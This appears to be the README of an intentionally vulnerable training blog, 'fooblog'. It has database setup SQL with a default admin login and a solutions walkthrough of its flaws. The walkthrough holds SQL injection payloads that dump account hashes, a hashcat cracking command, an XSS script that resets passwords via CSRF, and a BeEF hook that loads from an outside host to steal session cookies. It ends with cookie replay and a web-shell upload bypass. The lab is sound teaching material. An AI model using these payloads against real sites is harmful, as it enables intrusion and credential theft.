INSTALLATION
""""""""""""

1) Create a database in pgAdmin, apply CONNECT, DELETE, INSERT, SELECT and UPDATE permissions for the user:

https://chartio.com/docs/datasources/connections/details/pgadmin

2) Create tables and populate with initial data:

CREATE TABLE Users(
	userId varchar,
	userName varchar,
	userAlias varchar,
	passwordHash varchar,
	groupId varchar,
	email varchar,
	address varchar,
	city varchar,
	country varchar,
	profileimg varchar,
	profileBody varchar
);

INSERT INTO Users (userId, userName, userAlias, passwordHash, groupId, email, address, city, country, profileimg, profilebody) VALUES ('tImP6SvGU4gLh7Al', 'admin', 'Foo Admin', '2C26B46B68FFC68FF99B453C1D30413413422D706483BFA0F98A5E886266E7AE', 'JwzVLEfvDiyueXLp', 'foo@bar.com', '', '', '', '', 'I am the default admin.');

GRANT SELECT, UPDATE, INSERT, DELETE ON TABLE users TO GROUP fooblog_application;

CREATE TABLE Resets(
	resetId varchar,
	userId varchar,
	resetTime timestamp
);

GRANT SELECT, UPDATE, INSERT, DELETE ON TABLE resets TO GROUP fooblog_application;

CREATE TABLE Groups(
	groupId varchar,
	groupName varchar
);

INSERT INTO Groups (groupId, groupName) VALUES ('ri3EKpc5Z5gN4FEu', 'users');
INSERT INTO Groups (groupId, groupName) VALUES ('JwzVLEfvDiyueXLp', 'admins');

GRANT SELECT, UPDATE, INSERT, DELETE ON TABLE groups TO GROUP fooblog_application;

CREATE TABLE Categories(
	catId varchar,
	catName varchar
);

INSERT INTO Categories (catId, catName) VALUES ('8JwKUxr15k3d1JYY', 'Default');

GRANT SELECT, UPDATE, INSERT, DELETE ON TABLE categories TO GROUP fooblog_application;

CREATE TABLE Posts(
	postId serial primary key,
	postTime timestamp,
	catId varchar,
	postTitle varchar,
	postBrief varchar,
	postBody varchar,
	postEnabled boolean
);

GRANT SELECT, UPDATE, INSERT, DELETE ON TABLE posts TO GROUP fooblog_application;
GRANT USAGE, SELECT ON SEQUENCE posts_postid_seq TO GROUP fooblog_application;

CREATE TABLE Comments(
	commentId varchar,
	commentTime timestamp,
	userId varchar,
	postId integer,
	commentBody varchar
);

GRANT SELECT, UPDATE, INSERT, DELETE ON TABLE comments TO GROUP fooblog_application;

CREATE TABLE Reviews(
	reviewId varchar,
	reviewTime timestamp,
	userId varchar,
	merchId varchar,
	reviewBody varchar
);

GRANT SELECT, UPDATE, INSERT, DELETE ON TABLE reviews TO GROUP fooblog_application;

CREATE TABLE Merchandise(
	merchId varchar,
	merchName varchar,
	merchBrief varchar,
	merchBody varchar,
	merchPrice varchar,
	marchImg varchar,
	merchEnabled boolean
);

GRANT SELECT, UPDATE, INSERT, DELETE ON TABLE merchandise TO GROUP fooblog_application;


3) Open the frontend solution in Visual Studio (2012+) and alter the web config:

- Machine keys.
- Group ID's (if altered).
- SMTP server.
- Connection string.

4) Publish the frontend.

5) Log in with:

user: admin
password: foo



SOLUTIONS
"""""""""

SQLi
""""
View Post (query string):

Clear post:
' AND '1'='0
Show post:
' AND '1'='1
Sleep (PoC time-based SQLi):
'; SELECT pg_sleep(5)--
Find number of columns:
' AND '1'='0' UNION SELECT '1','2','3','4','5','6','7'--
As parameter 2 is a timestamp you must null it:
' AND '1'='0' UNION SELECT '1',null,'3','4','5','6','7'--
List tables:
' AND '1'='0' UNION SELECT '1',null,'3','4',tablename,'6','7' FROM pg_catalog.pg_tables WHERE schemaname = 'public'--
You can also use time based responses to aid you when there's no error output:
'; SELECT CASE WHEN ((SELECT COUNT(*) FROM pg_catalog.pg_tables WHERE schemaname = 'public' AND tablename = 'users') > 0) THEN pg_sleep(5) END--
List columns:
' AND '1'='0' UNION SELECT '1',null,'3','4',column_name,'6','7' FROM information_schema.columns WHERE table_name = 'users'--
Dump accounts:
' AND '1'='0' UNION SELECT '1',null,'3',username,passwordhash,'6','7' FROM users--


Search (using ZAP to alter searchText parameter):

Get accounts:
a%' OR '1'='0' UNION SELECT '1',null,'3',username,passwordhash,null,'7','8' FROM users--

Merchandise item pages employ:
- Input validation.
- Constrained input (text fields and SQL parameters).
- Output encoding and sanitisation.
- Parameterised SQL.


Missing Function Level Access Control
"""""""""""""""""""""""""""""""""""""
Links to admin pages are simply hidden in the UI - only require authentication.

Post ID's are integers, which are easy to brute force. i.e.

- View an unpublished post.
- SQL permits viewing of unpublished post.

Merchandise ID's are 16 char random strings: very difficult to brute force. The SQL queries also prohibit the loading of unpublished items.


Poor Cryptography/Sensitive Data Exposure:
""""""""""""""""""""""""""""""""""""""""""
SQLi obtained SHA256 hashes can be easily cracked combining large 100 million password wordlist with permutation rules:

oclhashcat64.exe -a 0 -m 1400 -r rules/best64.rule -o ../results/out.txt ../tocrack/in.txt ../wordlists/entropy.dic

For home PC's, cracking standard crypto has really jumped out of the feasible box into the incredibly practical box. Using an overclocked GTX Titan X you're looking at:

20,000,000,000 hashes per second of MD5.
6,000,000,000 hashes per second of SHA1.
2,000,000,000 hashes per second of SHA256.
520,000,000 hashes per second of SHA512.

However, modern credential specific hashing algorithms remain resistent:

17,000 hashes per second of bcrypt.

bcrypt hashing is intentionally slow... you tune it's work factor depending on your hardware and how long you can handle the process taking. In saying this, algorithms like SHA256 are useful for when you need a process to complete quickly or confidentiality isn't a concern - like checksum verification.


XSS + CSRF
""""""""""
You can use AJAX to reset password via reset_pass.ashx. No token required, unlike other forms.

Using ZAP on comments page:

Minify:
<script>var jsonData=JSON.stringify({Password:"foo",Confirmation:"foo"});$.ajax({url:"https://x.x.x.x/fooblog/reset_handler.ashx",type:"POST",data:jsonData,xhrFields:{withCredentials:!0}});</script>

Encrypt the script (including tags) using http://www.gaijin.at/en/olsjse.php

Inject the script into a comment.

- View in post view (unencoded output).
- View in post editor (encoded and sanitised output).

Attempt the same for a merchandise item review.

- View in merchandise (encoded and sanitised output).
- View in merchandise editor (encoded and sanitised output).


For demonstration purposes, BeEF has solid impact. In a comment (or via the search function, to illustrate reflective XSS):

<script src="http://x.x.x.x:3000/hook.js"></script>

You can then use the BeEF "Get Cookie" command (under Browser > Hooked Domain) to steal the session cookie and continue below:


Session Handling
""""""""""""""""
Session ID's aren't tied to a specific endpoint/browser. As such they're replayable in other browsers.

Using a stolen cookie, forge one as follows:

Name: fooblog.auth
Content: <string>
Host: x.x.x.x
Path: /

Reload the main page and note the new functions in the bottom menu.


File Upload
"""""""""""
Alter the extension of an ASPX (or PHP if your IIS server has PHP enabled) shell to .bmp, .gif, .jpg or .png.

Upload the file as your profile image with the ZAP breakpoint enabled.

Alter the name of the file in the POST to have it's original extension.

View the location of the 'broken' profile picture link, and navigate to it to access your shell.